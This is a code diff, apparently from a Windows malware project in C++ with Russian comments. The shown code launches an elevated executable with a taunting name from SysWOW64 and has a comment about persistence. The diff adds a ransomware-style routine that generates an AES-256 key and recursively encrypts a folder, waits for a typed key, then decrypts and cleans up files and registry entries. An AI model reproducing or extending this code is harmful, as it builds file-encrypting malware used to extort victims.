@@ -1,6 +1,9 @@
-#include "func.h"
-#include "include.h"
-#include "threads.h"
+#include "pers/func.h"
+#include "pers/include.h"
+#include "pers/threads.h"
+
+#include "encrypt/cryptor.h"
+
 using namespace std;
 // g++ main.cpp -static -static-libgcc -static-libstdc++ -lgdi32 -o my_program.exe
 
@@ -40,14 +43,33 @@ int main(int argc, char* argv[]) {
     ShellExecute(NULL, "runas", "C:\\Windows\\SysWOW64\\adskisatana666.exe", NULL, NULL, SW_SHOWNORMAL);
     // тут основной процесс закрепления 
     std::string filename = "C:\\Windows\\SysWOW64\\" + getDiskSerial() + ".txt";
-    while (true) {
-        if (GetFileAttributesA(filename.c_str()) != INVALID_FILE_ATTRIBUTES) {
-            std::cout << "Found file!" << std::endl;
-            DeleteFileA(filename.c_str());
-            break;
-        }
+
+
+    // { ENCRYPTION } //
+     
+    ShowWindow(Console, 1);
+
+    std::string path;
+    path = "C:\\dummy\\";
+    
+    std::cout << "[i] Working within  " << path << ".\n";
+    AES256CBC AES;
+
+    AES.generateKey();
+    AES.encryptRecursively(path);
+
+    // { END ENCRYPTION } //
+
+
+    std::string fakeKey;
+    while (fakeKey != "123") {
+        std::cin >> fakeKey;
         Sleep(5000); // Пауза 5 секунд перед следующей проверкой
     }
+
+    AES.keyFromFile();
+    AES.decryptRecursively();
+
     cleanfile();
     cleanreg();
     reset();
